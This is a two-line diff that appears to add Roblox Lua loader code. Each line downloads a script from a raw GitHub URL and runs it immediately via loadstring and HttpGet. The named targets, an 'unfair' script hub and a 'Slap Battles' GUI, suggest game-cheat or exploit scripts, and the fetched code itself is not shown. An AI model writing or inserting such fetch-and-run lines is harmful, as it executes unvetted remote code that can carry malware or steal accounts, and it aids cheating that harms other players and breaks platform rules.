@@ -1,0 +1,2 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua"),true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dizyhvh/slap_battles_gui/main/0.lua"))();
